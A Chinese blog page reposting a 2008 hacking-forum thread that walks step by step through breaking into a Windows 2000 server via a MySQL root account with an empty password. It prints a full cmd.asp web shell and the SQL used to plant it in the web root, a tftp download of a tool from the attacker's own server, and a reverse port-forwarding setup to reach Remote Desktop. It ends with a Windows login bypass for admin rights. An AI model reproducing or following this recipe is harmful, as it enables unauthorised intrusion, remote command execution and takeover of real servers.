
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 89 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/">3306端口的入侵(mysql)</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="3306-mysql-">3306端口的入侵(mysql)</h1>
<h2 id="-bbs-syue-com-http-bbs-syue-com-index-php-bbs-syue-com-"><a href="http://bbs.syue.com/index.php" title="岁月联盟 - 技术社区 - BBS.SYUE.COM" target="_blank"><img src="" alt="岁月联盟 - 技术社区 - BBS.SYUE.COM"></a></h2>
<p><a href="http://bbs.syue.com/register.php" target="_blank">注册</a> <a href="http://bbs.syue.com/logging.php?action=login" target="_blank">登录</a></p>
<ul>
<li><a href="http://syue.com/" target="_blank">主站</a></li>
<li><a href="http://bbs.syue.com/index.php" target="_blank">论坛</a></li>
<li><a href="http://bbs.syue.com/search.php" target="_blank">搜索</a></li>
<li><a href="http://home.syue.com/" target="_blank">黑友会</a></li>
<li><a href="http://bbs.syue.com/faq.php" target="_blank">帮助</a></li>
<li><p><a href="http://bbs.syue.com/misc.php?action=nav" target="_blank">导航</a></p>
</li>
<li><p><a href="http://bbs.syue.com/pm.php?filter=newpm" target="_blank">私人消息 (0)</a></p>
</li>
<li><a href="http://bbs.syue.com/pm.php?filter=announcepm" target="_blank">公共消息 (0)</a></li>
<li><a href="http://bbs.syue.com/task.php?item=doing" target="_blank">论坛任务 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=systempm" target="_blank">系统消息 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=friend" target="_blank">好友消息 (0)</a></li>
<li><a href="http://bbs.syue.com/notice.php?filter=threads" target="_blank">帖子消息 (0)</a></li>
</ul>
<p><a href="http://bbs.syue.com/index.php" target="_blank">岁月联盟 - 技术社区 - BBS.SYUE.COM</a> » <a href="http://bbs.syue.com/forum-33-1.html" target="_blank">[ Hacking &amp; Defence ] 黑客攻击与防范</a> » 3306端口的入侵(mysql)
<a href="http://bbs.syue.com/forum-33-1.html" target="_blank">返回列表</a> <a href="http://bbs.syue.com/post.php?action=newthread&amp;fid=33" target="_blank">发帖</a></p>
<p><a href="http://bbs.syue.com/space.php?uid=7" target="_blank">猪猪</a></p>
<ul>
<li><a href="http://bbs.syue.com/pm.php?action=new&amp;uid=7" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.syue.com/my.php?item=buddylist&amp;newbuddyid=7&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.syue.com/space-uid-7.html" target="_blank">猪猪</a> <em>(Wei.H)**当前离线</em>
UID 7  帖子 7814  精华 230  积分 32287  威望 2777   金币 14812   贡献 3401   性别 男  来自 中国  在线时间 2333 小时  注册时间 2006-5-11  最后登录 2010-1-8 </p>
<p><a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=100298&amp;Site=岁月联盟 - 技术社区 - BBS.SYUE.COM&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://home.syue.com/space.php?uid=7" title="个人空间" target="_blank"><img src="" alt="个人空间"></a> <a href="http://www.hackerspirit.com/" title="查看个人网站" target="_blank"><img src="" alt="查看个人网站"></a><a href="http://bbs.syue.com/space-uid-7.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.syue.com/space-uid-7.html" target="_blank"><img src="" alt=""></a></p>
<p><em><a href="http://bbs.syue.com/faq.php?action=grouppermission&amp;searchgroupid=1" target="_blank">等级：管理员</a></em></p>
<p><img src="&quot;Rank: 22&quot;" alt=""></p>
<p><img src="&quot;闪坛最高荣誉勋章&quot;" alt="闪坛最高荣誉勋章"><img src="&quot;优秀版主勋章&quot;" alt="优秀版主勋章">
 <strong><a href="&quot;复制本帖链接&quot;"><em>1</em>/#</a> <em>跳转到 »</em> <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;extra=page%3D1&amp;ordertype=1" target="_blank">倒序看帖</a></strong></p>
<p><a href="http://bbs.syue.com/viewthread.php?action=printable&amp;tid=24861" target="_blank">打印</a></p>
<p>字体大小: tT</p>
<p><img src="" alt=""> <em>发表于 2008-5-11 11:52</em> | <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;page=1&amp;authorid=7" target="_blank">只看该作者</a></p>
<h1 id="3306-mysql-">3306端口的入侵(mysql)</h1>
<p>这一节说一下3306端口,通过Mysql入侵服务器.
坦白的讲，我对mysql知道的太少,只是知它于mssql相对应的1433端口，它是3306。在w2k上它主要和是php组合，我一直学习的是asp+acess,没学习过mysql,也从来没有通过mysql成功入侵过服务器.为了使我的总结生一点光，全面一点,我这儿就转一篇文章，利用mssql入侵w2k服务器。全文如下,我加了一个图和一点注解和读后感:
某天晚上在IRC的时候，一个老朋友说帮他看看他的新主页的安全性，然后给出URL是abc.target.net,我一看觉得挺眼熟的，target.net公 司里面的CEO，人事部经理，网管我都认识的，前段时间还差点去了那里做网管呢，呵呵，那就看看他们的服务器做的如何吧。
随后用nmap扫描了一下abc.target.net，发现开的端口挺多的，看来没有安装防火墙或做TCP/IP过滤。从IIS版本判断是Windows 2000的服 务器。IIS没什么好利用的，一看开了3306端口，是mysql的，就用我的mysql客户端尝试连接了一下，root的密码竟然为空(lcx注:默认安装)，后来就觉得没有多 大意思，于是把目标转<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>，他们的主站，哈哈。
Ok!先用nmap扫描一下，扫描结果如下：
25/tcp open smtp
53/tcp open domain
80/tcp open http
110/tcp open pop-3
389/tcp open ldap
1002/tcp open unknown
3306/tcp open mysql
然后从IIS版本判断目标是windows 2000服务器。从开放的端口来看，它要么是安装了防火墙，要么是做了TCP/IP过滤，呵呵，比 abc.target.net有意思多了。从25和110端口返回的数据来看，他们用的邮件服务器是IMail 6.04，没什么可利用的。IIS上面网管做了安全配 置，一些默认的CGI漏洞也没有，这也没什么好利用的。只剩下最后一个端口了，习惯性的用我的mysql客户端连接试试：
F:\cmd〉mysql -u root -h <a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>
Welcome to the MySQL monitor. Commands end with or \g.
Your MySQL connection id is 3038 to server version: 3.23.21-beta
Type &lt;|&gt;help;&lt;|&gt; or &lt;|&gt;\h&lt;|&gt; for help. Type &lt;|&gt;\c&lt;|&gt; to clear the buffer
mysql〉
也有图形连接方式,lcx给你个图看看.
<img src="" alt=""> <img src="" alt="MySQL.gif"></p>
<p><a href="http://bbs.syue.com/attachment.php?aid=NzMwNnwzMTc2ZjZkNXwxMjYyOTQ1ODE0fGM4MDVOTHF2T2t1bFd5cjZ4TEhwSFRtNXdLL0RFUWpxMjNWWE13MEhVQlp3Q2tr&amp;nothumb=yes" title="MySQL.gif" target="_blank"><strong>下载</strong></a> (14.15 KB)
2008-5-11 11:52
呵呵，不好意思，看来网管没有给mysql帐号root设置一个密码，是默认的空密码，那么我们就可以利用这个漏洞来做点什么了。如果是 MS-SQL数据库的话就好办啦，直接可以用xp_cmdshell来运行系统命令，但是可惜的是mysql没有类似MS-SQL那样的扩展存储过程。
现在我们可以利用这个漏洞来做三件事情：
〈1〉搜索mysql数据库里面的内容，看能不能找出一些有用的敏感信息，我找了一会儿就不想找了，呵呵
〈2〉读取服务器上的任何文件，当然前提是知道文件的物理路径
〈3〉以启动mysql服务用户的权限往服务器上写文件，前提是这个文件要不存在的，就是说不能覆盖文件
如果我们知道IIS主目录的物理路径的话,我们就可以往上面写一个ASP上去，然后通过IE来执行系统命令。怎么得到IIS目录的物理路径呢 ？天知道！
没办法，猜吧。。。。。。先在mysql默认数据库test中建一个表tmp，这个表只有一个字段str,类型为TEXT,
mysql〉 use test;create table tmp（str TEXT）;
Database changed
Query OK, 0 rows affected （0.05 sec）
然后凭着自己做网管的直觉，开始猜测IIS主目录的物理路径，c:\inetpub\wwwroot，c:\www，c:\wwwroot，c:\inetpub\web,d:\web， d:\wwwroot，都不对，55555。大概猜测到第10次，我的mysql客户端回显信息如下：
mysql〉load data infile &quot;d:\www\gb\about\about.htm&quot; into table tmp;
Query OK, 235 rows affected （0.05 sec）
Records: 235 Deleted: 0 Skipped: 0 Warnings: 0
哈哈哈，猜中了，IIS主目录的物理路径是d:\www，因为上面的文件的虚拟路径是<a href="http://www.target.net/gb/about/about.htm" target="_blank"><a href="http://www.target.net/gb/about/about.htm">http://www.target.net/gb/about/about.htm</a></a>，看来我得
到一个shell了，呵呵。
接下来我们就可以往d:\www\gb\about里面写一个ASP文件进去，然后通过<a href="http://www.target.net/gb/about/cmd.asp" target="_blank"><a href="http://www.target.net/gb/about/cmd.asp">http://www.target.net/gb/about/cmd.asp</a></a>来执行系统命令了。
然后在网上找来一个现成的cmd.asp，懒的自己去写了：）。Cmd.asp如下：
-------------------------------cmd.asp----------------------------------------
〈% Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile
On Error Resume Next
Set oScript = Server.CreateObject（&quot;&quot;WSCRIPT.SHELL&quot;&quot;）
Set oScriptNet = Server.CreateObject（&quot;&quot;WSCRIPT.NETWORK&quot;&quot;）
Set oFileSys = Server.CreateObject（&quot;&quot;Scripting.FileSystemObject&quot;&quot;）
szCMD = Request.Form（&quot;&quot;.CMD&quot;&quot;）
If （szCMD 〈〉 &quot;&quot;&quot;&quot;） Then
szTempFile = &quot;&quot;C:\&quot; &amp; oFileSys.GetTempName（）
Call oScript.Run （&quot;&quot;cmd.exe /c &quot;&quot; &amp; szCMD &amp; &quot;&quot; 〉 &quot;&quot; &amp; szTempFile, 0, True）
Set oFile = oFileSys.OpenTextFile （szTempFile, 1, False, 0）
End If %〉
〈HTML〉〈BODY〉〈FORM action=&quot;&quot;〈%= Request.ServerVariables（&quot;&quot;URL&quot;&quot;） %〉&quot;&quot; method=&quot;&quot;POST&quot;&quot;〉
〈input type=text name=&quot;&quot;.CMD&quot;&quot; size=45 value=&quot;&quot;〈%= szCMD %〉&quot;&quot;〉〈input type=submit value=&quot;&quot;Run&quot;&quot;〉〈/FORM〉〈PRE〉
〈% If （IsObject（oFile）） Then
On Error Resume Next
Response.Write Server.HTMLEncode（oFile.ReadAll）
oFile.Close
Call oFileSys.DeleteFile（szTempFile, True）
End If%〉
〈/BODY〉〈/HTML〉
----------------------------end of cmd.asp-----------------------------------
由于往mysql数据库中插入数据的时候，会过滤特殊字符什么的，例如双引号之类的，特别麻烦。各位留意没有，上面的ASP语句中，都是 两个双引号一起的，这样才能写进去，原来是一个双引号的。然后我在数据库中再建一个表：
mysql〉 use test;create table cmd（str TEXT）;
Database changed
Query OK, 0 rows affected （0.05 sec）
然后用如下语句，一句一句把上面的ASP写进去:
mysql〉 insert into cmd values（&quot;一行一行的asp代码，呵呵&quot;）;
为什么不全部一起写进去呢？呵呵，换行后，一会儿导出的文件就会有特殊字符了，asp就不能正常运行了，只能辛苦点一行一行写了。然 后把asp文件导到服务器上：
mysql〉select /<em> from cmd into outfile &quot;d:\www\gb\abou\cmd.asp&quot;;
然后把我们刚才建的表都删除掉：
mysql〉 use test; drop table tmp; drop table cmd;
ok!我们得到一个shell了，虽然权限不高，但毕竟已经向取得admin权限迈出一大步了，不是吗，呵呵。做这个asp文件可花了我不少时间 哦。现在我们利用这个shell来收集系统信息，尝试取得admin权限。
〈1〉先看一下系统文件权限设置如何：
c:\ Everyone:（OI）（CI）F
d:\ \xxx:（OI）（CI）（DENY）（特殊访问:）
DELETE
READ_CONTROL
WRITE_DAC
WRITE_OWNER
STANDARD_RIGHTS_REQUIRED
FILE_READ_DATA
FILE_WRITE_DATA
FILE_APPEND_DATA
FILE_READ_EA
FILE_WRITE_EA
FILE_EXECUTE
FILE_DELETE_CHILD
FILE_READ_ATTRIBUTES
FILE_WRITE_ATTRIBUTES
Everyone:（OI）（CI）F
看来我们现在就可以读写硬盘上的任何文件了，现在就可以改他的首页了，但这样做没意思，对不对，我们的目标是取得admin权限，呵呵 。
〈2〉然后搜索一下硬盘上都有些什么文件：
c:\Program Files 的目录下有两个比较有意思的文件，
2000-12-19 13:10 　Serv-U
2001-01-20 22:43 绿色警戒
把Serv-U里面的用户和密码读出来看看后，没有什么用处，然后进入绿色警戒目录看看，呵呵，除了log外，什么都没有，呵呵。
〈3〉再看看都有哪些用户：
Guest IUSR_SERVER_1 IUSR_SERVER-2
IWAM_SERVER_1 IWAM_SERVER-2 ceo[他们CEO的帐号J]
TsInternetUser
管理员有ceo 和target\Domain Admins，看来这台机器是他们域中的一台服务器。开始本来想给ceo下一个套，在他的启动目录里放一个程序，但后来看到这个帐号已经几个月没登陆了，就放弃了。
〈4〉看看启动了那些服务，这几个比较有意思, 看来都是默认的：
Task Scheduler
Simple Mail Transport Protocol （SMTP）
Task Scheduler
〈5〉看看网络状况，这几个比较有意思：
TCP 0.0.0.0:21 0.0.0.0:0 LISTENING
TCP 0.0.0.0:119 0.0.0.0:0 LISTENING
TCP 192.168.1.3:3389 0.0.0.0:0 LISTENING
看来有TermService，不过在网卡上做了TCP/IP过滤，只对内网开放，那么我们就来
〈6〉看看网卡设置信息：
Ethernet adapter 本地连接:
Connection-specific DNS Suffix . :
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter
Physical Address. . . . . . . . . : 00-E0-4C-68-C4-B2
DHCP Enabled. . . . . . . . . . . : No
IP Address. . . . . . . . . . . . : 192.168.1.3
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . :
DNS Servers . . . . . . . . . . . :
Ethernet adapter 本地连接 2:
Connection-specific DNS Suffix . :
Description . . . . . . . . . . . : Realtek RTL8139（A） PCI Fast Ethernet Adapter/#2
Physical Address. . . . . . . . . : 00-E0-4C-68-B8-FC
DHCP Enabled. . . . . . . . . . . : No
IP Address. . . . . . . . . . . . :xxx
Subnet Mask . . . . . . . . . . . :
Default Gateway . . . . . . . . . :
经过上面的一些步骤，对这台服务器的设置情况就有了一个大概的了解。如何取得admin权限？netdde?pipeupadmin?呵呵，无法利用，没 有可利用的可以登陆的用户。下套？等到什么时候，呵呵。
Okok!让我们来看看这个系统都打了些什么补丁。怎么查看？呵呵，打了补丁后，信息都会存贮在注册表中，查询注册表中的这个键值就行
了：&quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix&quot;，这样的话，我们得上传一个reg.exe[M$ Resource Kit中的命令行注册 表编辑器]到服务器里面，我们才能操作他的注册表。开始我想用先写一个ftp脚本，然后ftp -s:cmd.txt让他到我的服务器来下载，但结果失 败了，后来才想起他做了TCP/IP过滤，5555，我记性真不好。怎么办呢？有办法，用tftp来传输。我先在我的服务器上安装了一个Cisco TFTP
Server，然后在目标机器上运行tftp -I <a href="http://www.eyas.org/" target="_blank"><a href="http://www.eyas.org/">http://www.eyas.org/</a></a> GET reg.exe，呵呵，传输过去咯。然后运行
REG QUERY &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\hotfix&quot;
返回数据如下：
Listing of [Software\Microsoft\Windows NT\CurrentVersion\hotfix]
[Q147222]==〉这个不知道是什么东西，好象默认2k机器上都有
[Q269862]==〉Q269862_W2K_SP2_x86_CN.EXE==〉Microsoft IIS Unicode解码目录遍历漏洞!
[Q277873]==〉Q277873_W2K_sp2_x86_CN.EXE==〉Microsoft IIS CGI文件名检查漏洞!
呵呵，==〉和后面的说明是我加上去的，不是注册表中的。看来管理员不太勤快啊，只打了两个补丁。
哈哈！到了这一步，大家想到怎么取得admin权限了吗？呵呵，你一定也想到了，他的机器开了TermService服务，但windows2000登陆验证 可被绕过的漏洞没有安装补丁，此补丁为Q270676_W2K_SP2_x86_CN.EXE。由此看来，管理员只是删除了帮助法文件，而没有打补丁。用dir
c:\winnt\help\win/</em>验证一下，果然没有熟悉的输入法帮助文件。敌人没有输入法，我们帮他造，hoho~~别忘了我们可以往任何地方写文件哦。
嘻嘻，咱们也别高兴的太早了，别忘了他的机器做了TCP/IP过滤哦，我们是没有办法连接到他的3389端口的。不要着急，不要着急，让我 们先来看看他的TCP/IP过滤的设置情况。怎么看呢？老办法，查看注册表里面的键值啦。用刚才的reg.exe查询
〈1〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces]
[{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}]
[{612A3142-DB85-4D4E-8028-81A9EB4D6A51}]
〈2〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{4B41CFFB-4A20-42F8-9087-A89FE71FD8F4}]
MULTI_SZ IPAddress
MULTI_SZ TCPAllowedPorts 25;53;80;110;3306;
MULTI_SZ UDPAllowedPorts 0;
MULTI_SZ RawIPAllowedProtocols 0;
〈3〉reg QUERY &quot;HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}&quot;
Listing of [System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
{612A3142-DB85-4D4E-8028-81A9EB4D6A51}]
MULTI_SZ IPAddress 192.168.1.3;
MULTI_SZ TCPAllowedPorts 0;
MULTI_SZ UDPAllowedPorts 0;
MULTI_SZ RawIPAllowedProtocols 0;
篇幅关系，我过滤了一些输出。第二次查询的是外网网卡，我们可以得知只开放了TCP 25，53，80，110，3306，UDP全部，IP协议全部。 第三次查询的是内网网卡，没有任何限制。
现在我们可以把输入法帮助文件上传到他的c:\winnt\help目录下去，然后如果能连接到他的3389端口的话，我们就可以得到admin权限了。问 题的关键是外网网卡做了TCP/IP限制。55555，怎么办呢？如何突破？有办法！我们可以利用socket转发和反弹端口技术，照样可以连接到敌人 的TermService！
具体过程如下：
〈1〉在我的另一台服务<a href="http://www.eyas2.org/" target="_blank"><a href="http://www.eyas2.org/">http://www.eyas2.org/</a></a>[我称他为AgentMaster]上运行一个程序，监听3389端口[等待我的TermClient去连接]，监听11111端
口[等<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>来连接]，当然了，第2个端口可以随便选，第1个端口选其他的话，就要相应的修改
TermClient，比较麻烦
〈2〉<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>[我称他为AgentSlave]运行另外一个程序， 先连接<a href="http://www.eyas2.org:11111/" target="_blank"><a href="http://www.eyas2.org:11111/">http://www.eyas2.org:11111/</a></a>，再连接到192.168.1.3:3389[敌人服务器 内网的IP]
〈3〉 我的TermClient连接<a href="http://www.eyas2.org:3389/" target="_blank"><a href="http://www.eyas2.org:3389/">http://www.eyas2.org:3389/</a></a>，这样，数据通道就全部建立好了。接下来，两个程序就忠实的为我们转发数据了。
注意<a href="http://www.eyas2.orgwww.eyas.org/" target="_blank"><a href="http://www.eyas2.orgwww.eyas.org/">http://www.eyas2.orgwww.eyas.org/</a></a>可以为同一台服务器，但要保<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>能connect上你的服务器。192.168.1.3也可以换为他内网 的任何一个IP。这样，当我用TermClient连接<a href="http://www.eyas2.org/" target="_blank"><a href="http://www.eyas2.org/">http://www.eyas2.org/</a></a>的时候，其实是连接<a href="http://www.target.net/" target="_blank"><a href="http://www.target.net/">http://www.target.net/</a></a>。当熟悉的登陆界面出现在我面前，我熟练的调出输入法，取得admin权限，呵呵，心里还有那么一点点成就感！
简要的回顾一下：发现mysql漏洞==〉凭直觉猜中IIS物理路径==〉写一个cmd.asp文件上去得到一个shell==〉利用系统配置错误取得admin 权限接下来要做的事情，就是把漏洞通知他们的网管了[我可不敢直接告诉他们CEO，呵呵]，本来想在那机器上装个sniff什么的，再用来做跳 板进一步尝试入侵他的内网，但后来想想还是算了，呵呵。
这是我在网上发现一篇好文章,读起来如饮香醇,满心喜悦,并对作者由衷佩服，赞赏他的技术,更是思路.这也是我们菜鸟和伪高手努力的一个方向了.mysql入门指南。
<a href="">收藏</a> <a href="">分享</a>  **</p>
<p><a href="http://bbs.syue.com/space.php?uid=23555" target="_blank">djyangmaowei</a></p>
<ul>
<li><a href="http://bbs.syue.com/pm.php?action=new&amp;uid=23555" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.syue.com/my.php?item=buddylist&amp;newbuddyid=23555&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.syue.com/space-uid-23555.html" target="_blank">djyangmaowei</a> <em>当前离线</em>
UID 23555  帖子 65  精华 0  积分 141  威望 0   金币 66   贡献 0   在线时间 10 小时  注册时间 2008-4-29  最后登录 2008-9-17 </p>
<p><a href="http://home.syue.com/space.php?uid=23555" title="个人空间" target="_blank"><img src="" alt="个人空间"></a> <a href="http://bbs.syue.com/space-uid-23555.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href=""></a></p>
<p><a href="http://bbs.syue.com/space-uid-23555.html" target="_blank"><img src="" alt=""></a></p>
<p><em><a href="http://bbs.syue.com/faq.php?action=grouppermission&amp;searchgroupid=12" target="_blank">级别：上士</a></em></p>
<p><img src="&quot;Rank: 7&quot;" alt="">
 <strong><a href="&quot;复制本帖链接&quot;"><em>2</em>/#</a></strong></p>
<p><img src="" alt=""> <em>发表于 2008-5-19 16:44</em> | <a href="http://bbs.syue.com/viewthread.php?tid=24861&amp;page=1&amp;authorid=23555" target="_blank">只看该作者</a></p>
<p>qianghan  **</p>
<p><a href="">TOP</a>
<a href="http://bbs.syue.com/forum-33-1.html" target="_blank">返回列表</a></p>
<h3 id="-"><a href="">[收藏此主题]</a>  <a href="">[关注此主题的新回复]</a></h3>
<h3 id="-qq-msn-"><a href="">[通过 QQ、MSN 分享给朋友]</a></h3>
<p><strong><a href="http://bbs.syue.com/" target="_blank">岁月联盟</a></strong> ( <a href="http://www.miibeian.gov.cn/" target="_blank">皖ICP备05004589号 - 联系QQ:100298</a>)|<a href="mailto:admin@syue.com">联系我们</a> |<a href="http://bbs.syue.com/stats.php" target="_blank">论坛统计</a>|<a href="http://bbs.syue.com/archiver/" target="_blank">Archiver</a>|<a href="http://bbs.syue.com/wap/" target="_blank">WAP</a>|</p>
<p>GMT+8, 2010-1-8 18:16.</p>
<p>Powered by <strong><a href="http://www.discuz.net/" target="_blank">Discuz!</a></strong> <em>7.2</em></p>
<p>© 2001-2009 <a href="http://www.comsenz.com/" target="_blank">Comsenz Inc.</a>
<a href="http://www.google.com/" target="_blank"><img src="" alt="Google"></a> 输入您的搜索字词  提交搜索表单   Web syue.com</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/X/">X</a></li></span></span> | <span class="tags">Tagged <a href="/tags/X/" class="label label-primary">X</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-X--3306端口的入侵mysql/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-X--3306端口的入侵mysql" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-X--Linux密码终极破解之战/">Linux密码终极破解之战</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-X--Linux密码终极破解之战/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="linux-">Linux密码终极破解之战</h1>
<h1 id="linux-">Linux密码终极破解之战</h1>
<p>2013-05-22 10:12 推荐: <a href="http://www.youxia.org/author/youxia/" title="由 网路游侠 发布" target="_blank">网路游侠</a> 浏览: 93 views <a href="http://www.youxia.org/linux-password-crack/#addcomment" target="_blank">我要评论</a><a href="http://www.youxia.org/linux-password-crack/#respond" title="《Linux密码终极破解之战》上的评论" target="_blank"></a> 字号: <a href="">大</a> <a href="">中</a> <a href="">小</a></p>
